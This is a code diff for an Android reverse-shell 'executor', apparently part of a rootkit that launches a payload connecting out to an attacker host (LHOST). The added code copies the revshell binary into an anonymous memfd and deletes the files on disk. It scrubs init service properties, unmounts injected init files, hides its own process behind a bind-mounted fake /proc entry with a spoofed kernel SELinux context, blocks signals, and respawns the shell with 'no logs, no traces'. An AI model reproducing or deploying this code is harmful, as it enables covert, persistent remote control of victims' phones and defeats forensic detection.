@@ -3,6 +3,8 @@
 
 #include <sys/mount.h>
 #include <sys/wait.h>
+#include <sys/mman.h>
+#include <sys/syscall.h>
 #include <unistd.h>
 #include <dirent.h>
 #include <pthread.h>
@@ -16,7 +18,7 @@
 
 
 #ifdef MAGISK_DEBUG
-#define LOG_TAG "revshell_exec"
+#define LOG_TAG                     "revshell_exec"
 #define ALOGD(...) __android_log_print(ANDROID_LOG_DEBUG,    LOG_TAG, __VA_ARGS__)
 #else
 #define ALOGD(...)
@@ -24,18 +26,28 @@
 
 #define CHECK_FS_DECRYPTED_INTERVAL 5
 
-#define ENCRYPTED_FS_CHECK_DIR "/data/data"
-#define ENCRYPTED_FS_CHECK_PROOF "android"
+#define ENCRYPTED_FS_CHECK_DIR      "/data/data"
+#define ENCRYPTED_FS_CHECK_PROOF    "android"
 
-#define TEMP_MNT_POINT "/mnt/secure"
-#define TEMP_DIR "/temp"
+#define TEMP_MNT_POINT              "/mnt/secure"
+#define TEMP_DIR                    TEMP_MNT_POINT "/temp"
+#define EMPTY_DIR                   TEMP_DIR "/.empty"
 
-#define PERSIST_DIR "/data/adb/.fura"
-#define EMPTY_DIR "/.empty"
+#define PERSIST_DIR                 "/data/adb/.fura"
 
-#define SBIN_REVSHELL "/sbin/revshell"
-#define DEV_REVSHELL "/dev/sys_ctl/revshell"
-#define DEBUG_REVSHELL "/debug_ramdisk/revshell"
+#define DEV_PATH                    "/dev/sys_ctl"
+#define DEV_REVSHELL                DEV_PATH "/revshell"
+#define DEV_SEPOLICY                "/dev/.sp"
+
+#define SBIN_REVSHELL               "/sbin/revshell"
+#define SBIN_EXECUTOR               "/sbin/executor"
+
+#define DEBUG_REVSHELL              "/debug_ramdisk/revshell"
+#define DEBUG_EXECUTOR              "/debug_ramdisk/executor"
+#define NEW_MAGISK_PATH             "/debug_ramdisk/magisk"
+
+#define INITRC_SYSTEM               "/system/etc/init/hw/init.rc"
+#define INIT_BIN_SYSTEM             "/system/bin/init"
 
 
 bool check_fs_decrypted() {
@@ -59,7 +71,7 @@ int hide_process(pid_t pid) {
 
     char buf[32];
     snprintf(buf, 31, "/proc/%d", pid);
-    return mount(TEMP_MNT_POINT TEMP_DIR EMPTY_DIR, buf, nullptr, MS_BIND, nullptr);
+    return mount(EMPTY_DIR, buf, nullptr, MS_BIND, nullptr);
 }
 
 int unhide_process(pid_t pid) {
@@ -82,7 +94,7 @@ void block_signals() {
 int monitor_proc(pid_t ppid) {
     // Monitor all children of ppid and hide them
     std::string proc_dir = "/proc/";
-    ALOGD("restarting ...");
+    ALOGD("Starting revshell ...");
 
 #ifdef HIDE_PROCESS_BIND
     hide_process(ppid);  // hide revshell
@@ -119,7 +131,6 @@ int monitor_proc(pid_t ppid) {
             ALOGD("Revshell died! (state = Z)");
             break;
         }
-
 
 #ifdef HIDE_PROCESS_BIND
         // hide it back if was revealed
@@ -161,16 +172,57 @@ int monitor_proc(pid_t ppid) {
     return -1;
 }
 
+int read_file(const char* filename, uint8_t** buf, size_t* filesize) {
+    FILE* file = fopen(filename, "rb");
+    if (!file) return -1;
+
+    fseek(file, 0, SEEK_END);
+    *filesize = ftell(file);
+    fseek(file, 0, SEEK_SET);
+
+    *buf = (uint8_t*) malloc(*filesize);
+    if (!buf) { fclose(file); return -1; }
+
+    fread(*buf, sizeof(uint8_t), *filesize, file);
+    fclose(file);
+
+    return 0;
+}
+
+std::string file_to_memfd(std::string filename) {
+    // I know mixing c and c++ is bad :P
+    uint8_t* buf;
+    size_t size;
+
+    if (read_file(filename.c_str(), &buf, &size) != 0) {
+        ALOGD("ERROR: Could not read from %s", filename.c_str());
+        return "";
+    }
+
+    int memfd = syscall(SYS_memfd_create, "anonymous", 0);
+    if (memfd == -1) { free(buf); return ""; }
+
+    write(memfd, buf, size);
+    free(buf);
+
+    lseek(memfd, 0, SEEK_SET);
+    std::string memfd_path = "/proc/self/fd/" + std::to_string(memfd);
+    ALOGD("memfd path: %s", memfd_path.c_str());
+
+    return memfd_path;
+}
 
 int main(int argc, char** argv, char** envp) {
     /**
      * Hidden execution of payload
      *
      * Make some preparations and Execute payload
-     *  1) check & create dirs (persistence, temp)
-     *  2) hide process
-     *  3) block all signals
-     *  4) execute revshell
+     *  1) hide props
+     *  2) check & create dirs (persistence, temp)
+     *  3) move revshell to RAM (memfd)
+     *  4) cleanup dirs
+     *  5) hide process using bind mounts (if defined)
+     *  6) execute revshell from memfd
      */
 
     setuid(0);
@@ -178,49 +230,89 @@ int main(int argc, char** argv, char** envp) {
     std::string revshell_path;
     int status;
 
-    // Hide prop:  init.svc.SVC_NAME
+    ALOGD("Executor is running");
+
+    ALOGD("Blocking signals");
+    block_signals();
+
+    // Hide props
     if (argc >= 2) {
+        ALOGD("Hiding init props");
+
         std::string svc_name = "init.svc." + std::string(argv[1]);
         delprop(svc_name.c_str());
 
         svc_name = "ro.boottime." + std::string(argv[1]);
         delprop(svc_name.c_str());
+
+        svc_name = "init.svc_debug_pid." + std::string(argv[1]);
+        delprop(svc_name.c_str());
     }
 
-    // Remount read-only /sbin on system-as-root
-    // (may fail on rootfs, no problem there)
-    if (access(SBIN_REVSHELL, F_OK) == 0) {
-        ALOGD("Remounting /sbin to avoid mount detection ...");
-        mount(nullptr, "/sbin", nullptr, MS_REMOUNT | MS_RDONLY, nullptr);
-        revshell_path = SBIN_REVSHELL;
+    // Unmount init.rc on android 11+ (if no magisk, i.e. revshell is not at debug_ramdisk)
+    if (access(INITRC_SYSTEM, F_OK) == 0 && access(DEBUG_REVSHELL, F_OK) != 0) {
+        ALOGD("Unmounting new init.rc");
+        umount2(INITRC_SYSTEM, MNT_DETACH);
+        umount2(INIT_BIN_SYSTEM, MNT_DETACH);
     }
-    else if (access(DEV_REVSHELL, F_OK) == 0)
-        revshell_path = DEV_REVSHELL;
-    else if (access(DEBUG_REVSHELL, F_OK) == 0)
-        revshell_path = DEBUG_REVSHELL;
+
+    // Cleanup /sbin on rootfs
+    if (access(SBIN_REVSHELL, F_OK) == 0) {
+        mount(nullptr, "/sbin", nullptr, MS_REMOUNT, nullptr);
+
+        revshell_path = file_to_memfd(SBIN_REVSHELL);
+        remove(SBIN_REVSHELL);
+        remove(SBIN_EXECUTOR);
+
+        mount(nullptr, "/sbin", nullptr, MS_REMOUNT | MS_RDONLY, nullptr);
+    }
+
+    // Remove /dev/sys_ctl, /dev/.sp on SAR / 2SI
+    else if (access(DEV_PATH, F_OK) == 0) {
+        revshell_path = file_to_memfd(DEV_REVSHELL);
+        umount2(DEV_PATH, MNT_DETACH);
+        usleep(1000);
+        rmdir(DEV_PATH);
+        remove(DEV_SEPOLICY);
+    }
+
+    // Cleanup /debug_ramdisk (new magisk dir)
+    else if (access(DEBUG_REVSHELL, F_OK) == 0) {
+        revshell_path = file_to_memfd(DEBUG_REVSHELL);
+        remove(DEBUG_REVSHELL);
+        remove(DEBUG_EXECUTOR);
+    }
+
     else {
         ALOGD("Error: revshell binary not found");
         return 1;
     }
 
-    // setup temp dir
-    ALOGD("Setting up " TEMP_MNT_POINT TEMP_DIR);
+    // Setup temp dir
+    ALOGD("Setting up " TEMP_DIR);
     mkdir(TEMP_MNT_POINT, 0700);
-    mkdir(TEMP_MNT_POINT TEMP_DIR, 0700);
-    system("chcon u:object_r:" SEPOL_PROC_DOMAIN ":s0 " TEMP_MNT_POINT TEMP_DIR);
+    mkdir(TEMP_DIR, 0700);
+    // If we are using our own context (not magisk), set temp dir context
+    if (access(NEW_MAGISK_PATH, F_OK) != 0)
+        system("chcon u:object_r:" SEPOL_PROC_DOMAIN ":s0 " TEMP_DIR);
 
 #ifdef HIDE_PROCESS_BIND
     // fake proc dir (.empty)
     //     for some reason can't set permissions directly, chmod needed?
-    mkdir(TEMP_MNT_POINT TEMP_DIR EMPTY_DIR, 0555);
+    mkdir(EMPTY_DIR, 0555);
     // fake selinux context and permissions
-    system("chmod 555 " TEMP_MNT_POINT TEMP_DIR EMPTY_DIR);
-    system("chcon u:r:kernel:s0 " TEMP_MNT_POINT TEMP_DIR EMPTY_DIR);
-    int fd = open(TEMP_MNT_POINT TEMP_DIR EMPTY_DIR "/cmdline", O_WRONLY | O_CREAT, 0555);
+    system("chmod 555 " EMPTY_DIR);
+    system("chcon u:r:kernel:s0 " EMPTY_DIR);
+    int fd = open(EMPTY_DIR "/cmdline", O_WRONLY | O_CREAT, 0555);
     close(fd);
-    mkdir(TEMP_MNT_POINT TEMP_DIR EMPTY_DIR "/fd", 0555);
+    mkdir(EMPTY_DIR "/fd", 0555);
+
+    ALOGD("Hiding daemon process ...");
+    hide_process(getpid());
+    ALOGD("Process hidden");
 #endif
 
+#ifdef CREATE_PERSIST_DIR
     // await decryption by user
     ALOGD("Awaiting decryption ...");
     while (!check_fs_decrypted())
@@ -236,24 +328,13 @@ int main(int argc, char** argv, char** envp) {
         mkdir(PERSIST_DIR, 0700);
     // practically useless since /data/adb/... is inaccessible without root anyway
     system("chcon u:object_r:" SEPOL_PROC_DOMAIN ":s0 " PERSIST_DIR);
-
-#ifdef HIDE_PROCESS_BIND
-    ALOGD("Blocking signals and hiding process ...");
-
-    block_signals();
-    hide_process(getpid());
-
-    ALOGD("Process hidden");
 #endif
 
     // my implementation of "service manager" (no logs, no traces)
-    // now service is started as oneshot, which apparently leaves no logs in dmesg!
+    // now service is started as oneshot, which does not spam to dmesg
     while (true) {
         pid_t revshell = fork();
-        if (revshell == -1) {
-            ALOGD("ERROR: Fork failed!");
-            exit(EXIT_FAILURE);
-        }
+        if (revshell == -1) exit(EXIT_FAILURE);
 
         if (revshell == 0) {
             // Child (revshell)
@@ -265,6 +346,9 @@ int main(int argc, char** argv, char** envp) {
             char *const rs_argv[] = {(char *const) revshell_path.c_str(), (char *const) LHOST, nullptr};
 #endif
             execve(revshell_path.c_str(), rs_argv, envp);
+
+            ALOGD("ERROR: Could not exec revshell!");
+            exit(1);
         } else {
             // Parent (executor)
             sleep(1);
